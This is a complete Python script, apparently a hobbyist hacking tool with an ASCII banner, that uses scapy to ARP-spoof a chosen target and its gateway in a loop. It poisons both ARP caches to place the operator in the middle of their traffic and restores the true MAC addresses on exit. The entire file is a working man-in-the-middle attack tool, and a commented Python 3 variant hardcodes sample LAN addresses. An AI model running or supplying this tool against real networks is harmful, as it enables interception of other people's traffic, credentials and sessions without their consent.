#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP")
    (values, arguments) = parser.parse_args()
    return values.target,values.gateway


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    (answered_list, unanswered_list) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def main(target_ip, gateway_ip):
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet sent : " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)


print(''' ____  _                          _ _ 
|  _ \| |__   __ _ _ __ _ __ ___ (_) | __ 
| | | | '_ \ / _` | '__| '_ ` _ \| | |/ / 
| |_| | | | | (_| | |  | | | | | | |   < 
|____/|_| |_|\__,_|_|  |_| |_| |_|_|_|\_\ 
''')


try:
    (target_ip, gateway_ip) = get_arguments()
    if target_ip and gateway_ip is not None:
        main(target_ip, gateway_ip)
    else:
        target_ip = raw_input("Target IP>")
        gateway_ip = raw_input("Gateway IP>")
        main(target_ip, gateway_ip)

except KeyboardInterrupt:
    print("\n[+] Please wait until default mac address has given to target machine")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] control+c quitting")




# For Python3
# while True:
#     spoof("192.168.43.29", "192.168.43.1")
#     spoof("192.168.43.1", "192.168.43.29")
#     sent_packet_count = sent_packet_count + 2
#     print("\r[+] Packet sent : " + str(sent_packet_count), end="")
#     time.sleep(2)
